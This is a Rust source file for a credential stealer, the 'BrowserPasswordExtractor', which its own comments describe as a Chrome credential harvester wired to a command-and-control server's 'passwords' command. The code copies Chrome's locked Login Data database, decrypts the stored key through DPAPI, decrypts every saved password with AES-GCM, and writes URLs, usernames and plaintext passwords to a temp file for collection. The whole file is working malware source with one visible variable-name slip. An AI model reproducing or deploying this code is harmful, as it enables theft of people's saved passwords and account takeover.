// pass.rs — Rust port of pass.cs (BrowserPasswordExtractor)
// Chrome credential harvester for C2 integration.
// Called via 'passwords' command from C2Server.

use std::fs;
use std::path::PathBuf;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit};
use aes_gcm::aead::Aead;
use base64::Engine;
use chrono::Utc;
use log::warn;
use rusqlite::Connection;
use serde::{Serialize, Deserialize};
use serde_json::Value;

// ==================== Data Model ====================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    pub url: String,
    pub username: String,
    pub password: String,
}

impl std::fmt::Display for Credential {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "URL: {}\nUser: {}\nPass: {}\n---", self.url, self.username, self.password)
    }
}

// ==================== Public API ====================

pub struct BrowserPasswordExtractor;

impl BrowserPasswordExtractor {
    /// Harvests all saved Chrome credentials.
    pub fn harvest_credentials() -> Vec<Credential> {
        let mut credentials = Vec::new();

        let chrome_user_data = get_chrome_user_data_dir();
        let login_db = chrome_user_data.join("Default").join("Login Data");

        if !login_db.exists() {
            return credentials;
        }

        let aes_key = match get_encryption_key(&chrome_user_data.join("Local State")) {
            Ok(key) => key,
            Err(e) => {
                warn!("[-] Key error: {}", e);
                return credentials;
            }
        };

        // Copy DB (Chrome locks it)
        let temp_dir = std::env::temp_dir().join(format!(
            "cs_{}",
            uuid::Uuid::new_v4().to_string().get(..8).unwrap_or("tmp")
        ));
        let _ = fs::create_dir_all(&temp_dir);
        let temp_db = temp_dir.join("Login Data");

        if let Err(e) = fs::copy(&login_db, &temp_db) {
            warn!("[-] Copy failed: {}", e);
            return credentials;
        }

        // Copy WAL/SHM for consistency
        copy_if_exists(
            &login_db.with_file_name("Login Data-wal"),
            &temp_dir.join("Login Data-wal"),
        );
        copy_if_exists(
            &login_db.with_file_name("Login Data-shm"),
            &temp_dir.join("Login Data-shm"),
        );

        match Connection::open_with_flags(&temp_db, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
            Ok(conn) => {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
                ) {
                    let rows = stmt.query_map([], |row| {
                        let url: String = row.get(0)?;
                        let username: String = row.get(1).unwrap_or_default();
                        let encrypted: Vec<u8> = row.get(2)?;
                        Ok((url, username, encrypted))
                    });

                    if let Ok(rows) = rows {
                        for row in rows.flatten() {
                            let (url, username, encrypted) = row;
                            if encrypted.is_empty() { continue; }

                            match decrypt_password(&encrypted, &aes_key) {
                                Ok(password) if !password.is_empty() => {
                                    credentials.push(Credential { url, username, password });
                                }
                                Ok(_) => {}
                                Err(_) => {
                                    credentials.push(Credential {
                                        url,
                                        username,
                                        password: "[DECRYPTION_FAILED]".to_string(),
                                    });
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => warn!("[-] SQLite error: {}", e),
        }

        let _ = fs::remove_dir_all(&temp_dir);
        credentials
    }

    /// Harvests credentials and returns as formatted text.
    pub fn harvest_to_string() -> String {
        let creds = Self::harvest_credentials();
        if creds.is_empty() {
            return "No Chrome credentials found.".to_string();
        }

        let mut output = format!("===== Chrome Credentials ({}) =====\n\n", creds.len());
        for cred in &creds {
            output.push_str(&format!("{}\n", cred));
        }
        output
    }

    /// Extracts passwords and saves to a text file.
    /// Called by C2Client on 'passwords' command.
    pub fn extract_passwords_to_file(filter: Option<&str>) -> String {
        let mut creds = Self::harvest_credentials();

        // Apply optional URL filter
        if let Some(f) = filter {
            creds.retain(|c| c.url.to_lowercase().contains(&f.to_lowercase()));
        }

        let output_path = std::env::temp_dir().join(format!(
            "passwords_{}.txt",
            Utc::now().format("%Y%m%d_%H%M%S")
        ));

        let content = if creds.is_empty() {
            "No credentials found.".to_string()
        } else {
            let mut sb = format!("===== Browser Credentials ({}) =====\n\n", creds.len());
            for cred in &creds {
                sb.push_str(&format!("{}\n", cred));
            }
            sb
        };

        let _ = fs::write(&output_path, &content);
        output_path.to_string_lossy().to_string()
    }
}

// ==================== Encryption Key ====================

fn get_encryption_key(local_state_path: &PathBuf) -> Result<Vec<u8>, String> {
    let json_str = fs::read_to_string(local_state_path)
        .map_err(|e| format!("Read error: {}", e))?;

    let parsed: Value = serde_json::from_str(&json_str)
        .map_err(|e| format!("JSON error: {}", e))?;

    let key_b64 = parsed
        .get("os_crypt")
        .and_then(|v| v.get("encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or("encrypted_key not found")?;

    let key_with_prefix = base64::engine::general_purpose::STANDARD
        .decode(key_b64)
        .map_err(|e| format!("Base64 error: {}", e))?;

    if key_with_prefix.len() <= 5 {
        return Err("Key too short".to_string());
    }

    // Strip "DPAPI" prefix
    let _key_bytes = &key_with_prefix[5..];

    #[cfg(target_os = "windows")]
    {
        dpapi_decrypt(key_bytes)
    }
    #[cfg(not(target_os = "windows"))]
    {
        Err("DPAPI requires Windows".to_string())
    }
}

// ==================== Decryption ====================

fn decrypt_password(encrypted: &[u8], aes_key: &[u8]) -> Result<String, String> {
    if encrypted.is_empty() {
        return Ok(String::new());
    }

    // Chrome v80+: "v10"/"v20" prefix → AES-256-GCM
    if encrypted.len() > 31
        && encrypted[0] == b'v'
        && (encrypted[1] == b'1' || encrypted[1] == b'2')
        && encrypted[2] == b'0'
    {
        let nonce = &encrypted[3..15];
        let data_len = encrypted.len() - 15;
        if data_len < 17 {
            return Err("Data too short for AES-GCM".to_string());
        }

        let ct_len = data_len - 16;
        let ciphertext = &encrypted[15..15 + ct_len];
        let tag = &encrypted[15 + ct_len..];

        let mut combined = Vec::with_capacity(ciphertext.len() + tag.len());
        combined.extend_from_slice(ciphertext);
        combined.extend_from_slice(tag);

        let key = Key::<Aes256Gcm>::from_slice(aes_key);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(nonce);

        cipher.decrypt(nonce, combined.as_ref())
            .map(|p| String::from_utf8_lossy(&p).to_string())
            .map_err(|e| format!("AES-GCM error: {}", e))
    } else {
        // Legacy DPAPI
        #[cfg(target_os = "windows")]
        {
            dpapi_decrypt(encrypted)
                .map(|b| String::from_utf8_lossy(&b).to_string())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("DPAPI requires Windows".to_string())
        }
    }
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    crate::chrom::dpapi_decrypt(data)
}

// ==================== Helpers ====================

fn get_chrome_user_data_dir() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        PathBuf::from(local).join(r"Google\Chrome\User Data")
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(".config/google-chrome")
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join("Library/Application Support/Google/Chrome")
    }
}

fn copy_if_exists(src: &PathBuf, dst: &PathBuf) {
    if src.exists() {
        let _ = fs::copy(src, dst);
    }
}
